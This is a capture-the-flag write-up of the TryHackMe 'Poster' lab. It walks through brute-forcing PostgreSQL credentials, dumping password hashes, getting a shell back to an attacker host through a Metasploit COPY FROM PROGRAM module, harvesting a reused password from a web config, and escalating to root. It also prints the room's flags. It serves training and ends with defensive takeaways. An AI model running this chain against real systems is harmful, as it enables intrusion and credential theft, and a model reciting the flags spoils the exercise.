# TryHackMe — Poster

**Room:** Poster  
**Difficulty:** Easy  
**Category:** Database Exploitation / Privilege Escalation  
**OS:** Linux (Ubuntu)

---

## Summary

This room demonstrates how an exposed PostgreSQL instance with default credentials can lead to full system compromise. The attack chain covers credential brute-forcing, RCE via `COPY FROM PROGRAM`, credential harvesting from a web config file, and privilege escalation to root via `sudo`.

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sV -sC 10.65.158.60
```

**Results:**

| Port | State | Service | Version |
|------|-------|---------|---------|
| 22/tcp | open | SSH | OpenSSH 7.2p2 Ubuntu |
| 80/tcp | open | HTTP | Apache 2.4.18 (Poster CMS) |
| 5432/tcp | open | PostgreSQL | 9.5.8 - 9.5.10 |

Three services identified. The most interesting target is **PostgreSQL on port 5432** — exposed directly to the network, which is a significant misconfiguration.

---

## Exploitation

### Step 1 — Brute-force PostgreSQL Credentials

Using Metasploit's login scanner:

```
use auxiliary/scanner/postgres/postgres_login
set RHOSTS 10.65.158.60
run
```

**Result:**
```
[+] 10.65.158.60:5432 - Login Successful: postgres:password@template1
```

Credentials found: `postgres:password`

---

### Step 2 — Enumerate the Database

Connected directly via `psql`:

```bash
psql -h 10.65.158.60 -U postgres -W
```

Key findings:

```sql
-- PostgreSQL version
SELECT version();
-- PostgreSQL 9.5.21 on x86_64-pc-linux-gnu

-- Current user is superuser
SELECT usesuper FROM pg_user WHERE usename = current_user;
-- t (true)

-- All database users
SELECT usename, usesuper FROM pg_user;
```

| Username | Superuser |
|----------|-----------|
| postgres | t |
| tryhackme | f |
| sistemas | f |
| ti | f |
| darkstart | f |
| poster | f |

The `postgres` user is a **superuser** — this enables OS-level command execution via `COPY FROM PROGRAM`.

---

### Step 3 — Dump Password Hashes

```
use auxiliary/scanner/postgres/postgres_hashdump
set RHOSTS 10.65.158.60
set USERNAME postgres
set PASSWORD password
run
```

**Result — 6 hashes dumped:**

| Username | Hash |
|----------|------|
| darkstart | md58842b99375db43e9fdf238753623a27d |
| poster | md578fb805c7412ae597b399844a54cce0a |
| postgres | md532e12f215ba27cb750c9e093ce4b5127 |
| sistemas | md5f7dbc0d5a06653e74da6b1af9290ee2b |
| ti | md57af9ac4c593e9e4f275576e13f935579 |
| tryhackme | md503aab1165001c8f8ccae31a8824efddc |

---

### Step 4 — Remote Code Execution via COPY FROM PROGRAM

Since `postgres` is a superuser, we can execute OS commands using PostgreSQL's `COPY FROM PROGRAM` feature.

```
use exploit/multi/postgres/postgres_copy_from_program_cmd_exec
set RHOSTS 10.65.158.60
set USERNAME postgres
set PASSWORD password
set LHOST <attacker_IP>
run
```

Got a shell as `postgres`.

---

### Step 5 — Credential Harvesting from Web Config

```bash
cat /var/www/html/config.php
```

```php
<?php
    $dbhost = "127.0.0.1";
    $dbuname = "alison";
    $dbpass = "p4ssw0rdS3cur3!#";
    $dbname = "mysudopassword";   // <-- hint!
?>
```

The database name `mysudopassword` is a strong hint that this password is reused for `sudo`.

---

### Step 6 — Lateral Movement to alison

```bash
su alison
# Password: p4ssw0rdS3cur3!#

cat /home/alison/user.txt
```

**user.txt:** `THM{postgresql_fa1l_conf1gurat1on}`

---

### Step 7 — Privilege Escalation to root

```bash
sudo su
# Password: p4ssw0rdS3cur3!#

cat /root/root.txt
```

**root.txt:** `THM{c0ngrats_for_read_the_f1le_w1th_credent1als}`

---

## Attack Chain

```
Nmap scan
    └─> PostgreSQL 5432 exposed
            └─> Brute-force: postgres:password
                    └─> Superuser confirmed
                            └─> COPY FROM PROGRAM RCE → shell (postgres)
                                    └─> config.php → alison:p4ssw0rdS3cur3!#
                                            └─> su alison → user.txt
                                                    └─> sudo su → root.txt
```

---

## Key Takeaways

- **Never expose PostgreSQL directly to the network** without strict firewall rules
- **Default/weak credentials** (`postgres:password`) are trivially brute-forced
- **PostgreSQL superuser = OS command execution** via `COPY FROM PROGRAM` — treat it as RCE primitive
- **Password reuse** between the database config and system accounts is a critical misconfiguration
- The database name `mysudopassword` was an intentional hint — in real engagements, developers often embed sensitive comments or metadata in configs

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Service enumeration |
| Metasploit `postgres_login` | Credential brute-force |
| Metasploit `postgres_hashdump` | Hash extraction |
| Metasploit `postgres_copy_from_program_cmd_exec` | RCE via COPY FROM PROGRAM |
| psql | Manual DB enumeration |

---

*TryHackMe — Poster | Writeup by Artem*
